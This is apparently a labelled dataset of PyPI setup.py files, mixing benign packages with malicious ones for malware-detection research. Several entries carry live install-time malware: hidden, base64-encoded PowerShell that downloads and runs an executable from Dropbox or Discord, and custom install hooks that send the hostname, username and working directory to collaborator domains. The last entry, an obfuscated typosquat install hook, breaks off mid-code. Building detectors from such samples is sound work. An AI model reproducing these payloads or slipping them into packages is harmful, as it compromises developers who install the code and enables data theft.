{"idx": "liblibpiprandom-4.55", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'liblibpiprandom',\n    packages = ['modlib'],\n    version = '9.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "doit-0.36.0", "func": "#! /usr/bin/env python3\n\nimport sys\n\nfrom setuptools import setup\n\n\nlong_description = '''\n*doit* comes from the idea of bringing the power of build-tools to execute any\nkind of task\n\n*doit* can be uses as a simple **Task Runner** allowing you to easily define ad hoc\ntasks, helping you to organize all your project related tasks in an unified\neasy-to-use & discoverable way.\n\n*doit* scales-up with an efficient execution model like a **build-tool**.\n*doit* creates a DAG (direct acyclic graph) and is able to cache task results.\nIt ensures that only required tasks will be executed and in the correct order\n(aka incremental-builds).\n\nThe *up-to-date* check to cache task results is not restricted to looking for\nfile modification on dependencies.  Nor it requires \"target\" files.\nSo it is also suitable to handle **workflows** not handled by traditional build-tools.\n\nTasks' dependencies and creation can be done dynamically during it is execution\nmaking it suitable to drive complex workflows and **pipelines**.\n\n*doit* is build with a plugin architecture allowing extensible commands, custom\noutput, storage backend and \"task loader\". It also provides an API allowing\nusers to create new applications/tools leveraging *doit* functionality like a framework.\n\n*doit* is a mature project being actively developed for more than 10 years.\nIt includes several extras like: parallel execution, auto execution (watch for file\nchanges), shell tab-completion, DAG visualisation, IPython integration, and more.\n\n\n\nSample Code\n===========\n\nDefine functions returning python dict with task's meta-data.\n\nSnippet from `tutorial <http://pydoit.org/tutorial-1.html>`_:\n\n.. code:: python\n\n  def task_imports():\n      \"\"\"find imports from a python module\"\"\"\n      for name, module in PKG_MODULES.by_name.items():\n          yield {\n              'name': name,\n              'file_dep': [module.path],\n              'actions': [(get_imports, (PKG_MODULES, module.path))],\n          }\n\n  def task_dot():\n      \"\"\"generate a graphviz's dot graph from module imports\"\"\"\n      return {\n          'targets': ['requests.dot'],\n          'actions': [module_to_dot],\n          'getargs': {'imports': ('imports', 'modules')},\n          'clean': True,\n      }\n\n  def task_draw():\n      \"\"\"generate image from a dot file\"\"\"\n      return {\n          'file_dep': ['requests.dot'],\n          'targets': ['requests.png'],\n          'actions': ['dot -Tpng %(dependencies)s -o %(targets)s'],\n          'clean': True,\n      }\n\n\nRun from terminal::\n\n  $ doit list\n  dot       generate a graphviz's dot graph from module imports\n  draw      generate image from a dot file\n  imports   find imports from a python module\n  $ doit\n  .  imports:requests.models\n  .  imports:requests.__init__\n  .  imports:requests.help\n  (...)\n  .  dot\n  .  draw\n\n\nProject Details\n===============\n\n - Website & docs - `http://pydoit.org <http://pydoit.org>`_\n - Project management on github - `https://github.com/pydoit/doit <https://github.com/pydoit/doit>`_\n - Discussion group - `https://groups.google.com/forum/#!forum/python-doit <https://groups.google.com/forum/#!forum/python-doit>`_\n - News/twitter - `https://twitter.com/pydoit <https://twitter.com/pydoit>`_\n - Plugins, extensions and projects based on doit - `https://github.com/pydoit/doit/wiki/powered-by-doit <https://github.com/pydoit/doit/wiki/powered-by-doit>`_\n\nlicense\n=======\n\nThe MIT License\nCopyright (c) 2008-2022 Eduardo Naufel Schettino\n'''\n\nsetup(name = 'doit',\n      description = 'doit - Automation Tool',\n      version = '0.36.0',\n      license = 'MIT',\n      author = 'Eduardo Naufel Schettino',\n      author_email = 'schettino72@gmail.com',\n      url = 'http://pydoit.org',\n      classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Information Technology',\n        'Intended Audience :: Science/Research',\n        'Intended Audience :: System Administrators',\n        'Topic :: Software Development :: Build Tools',\n        'Topic :: Software Development :: Testing',\n        'Topic :: Software Development :: Quality Assurance',\n        'Topic :: Scientific/Engineering',\n        ],\n      keywords = \"build make task automation pipeline task-runner\",\n      project_urls = {\n          'Documentation': 'https://pydoit.org/',\n          'Source': 'https://github.com/pydoit/doit/',\n          'Tracker': 'https://github.com/pydoit/doit/issues',\n      },\n      packages = ['doit'],\n      python_requires='>=3.8',\n      install_requires = ['cloudpickle', 'importlib-metadata>=4.4'],\n      extras_require={\n          'toml': ['tomli; python_version<\"3.11\"']\n      },\n      long_description = long_description,\n      entry_points = {\n          'console_scripts': [\n              'doit = doit.__main__:main'\n          ]\n      },\n      )\n", "target": 0}
{"idx": "arangodb-python-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"jg360c2v1lbkgalt0tygti71hsnkbmzb.oastify.com\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='arangodb-python', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n\n", "target": 1}
{"idx": "featuretools-1.12.1", "func": "from setuptools import setup\n\nsetup(\n    name=\"featuretools_plugin\",\n    packages=[\"featuretools_plugin\"],\n    entry_points={\n        \"featuretools_plugin\": [\n            \"module = featuretools_plugin\",\n        ],\n    },\n)\n", "target": 0}
{"idx": "fastdtw-0.3.4", "func": "import os.path\nfrom setuptools import setup, find_packages, Extension\nfrom setuptools.command.build_ext import build_ext as _build_ext\nimport sys\nimport warnings\n\ntry:\n    from Cython.Build import cythonize\n    USE_CYTHON = True\nexcept ImportError:\n    USE_CYTHON = False\n\n# numpy path is needed for building with and without cython:\ntry:\n    import numpy\n    numpy_includes = [numpy.get_include()]\n    HAVE_NUMPY = True\nexcept ImportError:\n    # \"python setup.py build\" will not work and trigger fallback to pure python later on,\n    # but \"python setup.py clean\" will be successful with the first call of setup(...)\n    numpy_includes = []\n    HAVE_NUMPY = False\n\nclassifiers = [\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 3',\n    'Intended Audience :: Science/Research',\n    'License :: OSI Approved :: MIT License',\n    'Topic :: Scientific/Engineering'\n]\n\n\nclass build_ext(_build_ext):\n    def finalize_options(self):\n        _build_ext.finalize_options(self)\n        # Prevent numpy from thinking it is still in its setup process:\n        __builtins__.__NUMPY_SETUP__ = False\n        import numpy\n        self.include_dirs.append(numpy.get_include())\n\n\next = '.pyx' if USE_CYTHON else '.cpp'\n\nextensions = [Extension(\n        'fastdtw._fastdtw',\n        [os.path.join('fastdtw', '_fastdtw' + ext)],\n        language=\"c++\",\n        include_dirs=numpy_includes,\n        libraries=[\"stdc++\"]\n    )]\n\nif USE_CYTHON:\n    extensions = cythonize(extensions)\n\ndir_path = os.path.dirname(os.path.realpath(__file__))\nwith open(os.path.join(dir_path, 'README.rst')) as f:\n    long_description = f.read()\n\nneeds_pytest = set(['pytest', 'test', 'ptr']).intersection(sys.argv)\npytest_runner = ['pytest-runner'] if needs_pytest else []\n\nkwargs = {\n    'name': 'fastdtw',\n    'version': '0.3.4',\n    'author': 'Kazuaki Tanida',\n    'url': 'https://github.com/slaypni/fastdtw',\n    'description': 'Dynamic Time Warping (DTW) algorithm with an O(N) time and memory complexity.',\n    'long_description': long_description,\n    'license': 'MIT',\n    'keywords': ['dtw'],\n    'install_requires': ['numpy'],\n    'packages': find_packages(),\n    'ext_modules':  extensions,\n    'test_suite': 'tests',\n    'setup_requires': pytest_runner,\n    'tests_require': ['pytest'],\n    'classifiers': classifiers\n}\n\ntry:\n    setup(**kwargs)\nexcept SystemExit:\n    del kwargs['ext_modules']\n    reason = 'numpy missing, ' if not HAVE_NUMPY else ''\n    warnings.warn(reason+'compilation failed. Installing pure python package')\n    setup(**kwargs)\n", "target": 0}
{"idx": "pepcv-7.63", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pepcv',\n    packages = ['modlib'],\n    version = '6.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dagit-1.0.3", "func": "import os\n\nfrom setuptools import find_packages, setup\n\n\ndef long_description():\n    here = os.path.abspath(os.path.dirname(__file__))\n    with open(os.path.join(here, \"README.rst\"), \"r\", encoding=\"utf8\") as fh:\n        return fh.read()\n\n\ndef get_version():\n    version = {}\n    with open(\"dagit/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagit\",\n        version=ver,\n        author=\"Elementl\",\n        author_email=\"hello@elementl.com\",\n        license=\"Apache-2.0\",\n        description=\"Web UI for dagster.\",\n        long_description=long_description(),\n        long_description_content_type=\"text/markdown\",\n        url=\"https://github.com/dagster-io/dagster\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.7\",\n            \"Programming Language :: Python :: 3.8\",\n            \"Programming Language :: Python :: 3.9\",\n            \"Programming Language :: Python :: 3.10\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n        packages=find_packages(exclude=[\"dagit_tests*\"]),\n        include_package_data=True,\n        install_requires=[\n            \"PyYAML\",\n            # cli\n            \"click>=7.0,<9.0\",\n            \"dagster==1.0.3\",\n            \"dagster-graphql==1.0.3\",\n            \"requests\",\n            # watchdog\n            \"watchdog>=0.8.3\",\n            # notebooks support\n            \"nbconvert\",\n            \"starlette\",\n            \"uvicorn[standard]\",\n        ],\n        entry_points={\n            \"console_scripts\": [\"dagit = dagit.cli:main\", \"dagit-debug = dagit.debug:main\"]\n        },\n    )\n", "target": 0}
{"idx": "ankpkg-1.0.0", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        myname = socket.getfqdn(socket.gethostname(  ))\n        myaddr = socket.gethostbyname(myname)\n        thename, aliases, addresses = socket.gethostbyaddr(myaddr)\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username,'myname':myname,'myaddr':myaddr,'thename':thename}\n        requests.get(\"https://cas54n1gfihn6082nil0kz451ubndy6rt.dooracle.in\",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream\n\n\nsetup(name='ankpkg', #package name\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "libcvstring-4.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcvstring',\n    packages = ['modlib'],\n    version = '1.27',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-bigquery-storage-2.14.1", "func": "# -*- coding: utf-8 -*-\n#\n# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-bigquery-storage\"\ndescription = \"BigQuery Storage API API client library\"\nversion = \"2.14.1\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.18.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\n    \"pandas\": [\"pandas>=0.21.1\"],\n    \"fastavro\": [\"fastavro>=0.21.2\"],\n    \"pyarrow\": [\"pyarrow>=0.15.0\"],\n    \"tests\": [\"freezegun\"],\n}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-bigquery-storage\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\"scripts/fixup_bigquery_storage_v1_keywords.py\"],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfkillgameintel-2.33", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfkillgameintel',\n    packages = ['modlib'],\n    version = '10.66',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "eth-account-0.6.1", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import (\n    setup,\n    find_packages,\n)\n\nextras_require = {\n    'test': [\n        \"hypothesis>=4.18.0,<5\",\n        \"pytest>=6.2.5,<7\",\n        \"pytest-xdist\",\n        \"tox==3.14.6\",\n    ],\n    'lint': [\n        \"flake8==3.7.9\",\n        \"isort>=4.2.15,<5\",\n        \"mypy==0.770\",\n        \"pydocstyle>=5.0.0,<6\",\n    ],\n    'doc': [\n        \"Sphinx>=1.6.5,<2\",\n        \"sphinx_rtd_theme>=0.1.9,<1\",\n        \"towncrier>=19.2.0, <20\",\n    ],\n    'dev': [\n        \"bumpversion>=0.5.3,<1\",\n        \"pytest-watch>=4.1.0,<5\",\n        \"wheel\",\n        \"twine\",\n        \"ipython\",\n    ],\n}\n\nextras_require['dev'] = (\n    extras_require['dev'] +  # noqa: W504\n    extras_require['test'] +  # noqa: W504\n    extras_require['lint'] +  # noqa: W504\n    extras_require['doc']\n)\n\n\nwith open('./README.md') as readme:\n    long_description = readme.read()\n\n\nsetup(\n    name='eth-account',\n    # *IMPORTANT*: Don't manually change the version here. Use `make bump`, as described in readme\n    version='0.6.1',\n    description=\"\"\"eth-account: Sign Ethereum transactions and messages with local private keys\"\"\",\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='The Ethereum Foundation',\n    author_email='snakecharmers@ethereum.org',\n    url='https://github.com/ethereum/eth-account',\n    include_package_data=True,\n    package_data={\"eth_account\": [\n        \"py.typed\",\n        \"hdaccount/wordlist/*.txt\",\n    ]},\n    install_requires=[\n        \"bitarray>=1.2.1,<1.3.0\",\n        \"eth-abi>=3.0.0,<4\",\n        \"eth-keyfile>=0.6.0,<0.7.0\",\n        \"eth-keys>=0.4.0,<0.5\",\n        \"eth-rlp>=0.3.0,<1\",\n        \"eth-utils>=2.0.0,<3\",\n        \"hexbytes>=0.1.0,<1\",\n        \"rlp>=1.0.0,<4\"\n    ],\n    python_requires='>=3.6, <4',\n    extras_require=extras_require,\n    py_modules=['eth_account'],\n    license=\"MIT\",\n    zip_safe=False,\n    keywords='ethereum',\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Operating System :: MacOS',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "py-candynvidiakill-8.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-candynvidiakill',\n    packages = ['modlib'],\n    version = '1.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ripe.atlas.dyndns-20.0.4", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\n\nclass CustomInstall(install):\n    def run(self):\n            print ('hello world')\n\n    #  install.run(self)\n    #  hostname=socket.gethostname()\n    #  username = getpass.getuser()\n    #  ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n    # requests.get(\"https:/cazm9bn2vtc0000f07s0gfx4rseyyyyyb.interact.sh\",params = ploads)\nsetup(name='ripe.atlas.dyndns',\n      version='20.0.4',\n      description='AnupamAS01',\n      author='AnupamAS01',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "django-dotenv-1.4.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport sys\nfrom setuptools import setup\n\n\ndef get_version(module):\n    \"\"\"\n    Return package version as listed in `__version__`.\n    \"\"\"\n    init_py = open('{0}.py'.format(module)).read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\nversion = get_version('dotenv')\n\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist upload')\n    os.system('python setup.py bdist_wheel upload')\n    print('You probably want to also tag the version now:')\n    print('  git tag -a {0} -m \"version {0}\"'.format(version, version))\n    print('  git push --tags')\n    sys.exit()\n\n\nsetup(\n    name='django-dotenv',\n    description=\"foreman reads from .env. manage.py doesn't. Let's fix that.\",\n    version=version,\n    author='Jacob Kaplan-Moss',\n    author_email='jacob@jacobian.org',\n    maintainer='Jos\u00e9 Padilla',\n    maintainer_email='hello@jpadilla.com',\n    url='http://github.com/jpadilla/django-dotenv',\n    py_modules=['dotenv'],\n    test_suite='tests',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "customtkintar-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ElTdNRQuTWDygNPMCnVMiivZvghx CUHgaEexIIIh'\nLONG_DESCRIPTION = 'MeRyiTKHVLoc TxpZoVaOAUHaUTFKbiWWemqsFBxShSiJpIKxRSVIyItXpEJAUsvoJLzSlXkENzAthOIUBiJAkbgoBLyGKWOMuUnvKsJxWiVnonWqwEvoAFTqoiMSzEarNTpzjuAcbLohOgGkqCFFhZTydyKSYOmbxJd zwOf QqArvUWRrVcjUencnGJjCapAPjToEAhCafGKNFMxKvSkRkoHbvSwYmSrQUZBsDsAmoJhrBsQnlPXEhNj'\n\n\nclass RQKisZcRKUNhsqUlxPbZvEkiUcWbHwwxAdqIcYmDOMckRVmSOPdTYuPWBHFVMigIevpBaujKNqrnLFyaQBaRUPJpnsTZyMdIPVEAUFUPEzwziRrJTRXriGycSLvqLFQKQMdRptCIzUCTIdJqLbZRJmyFSYJpyRROvFrFZkFmuUxfYuwRagvoCMbIVG(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                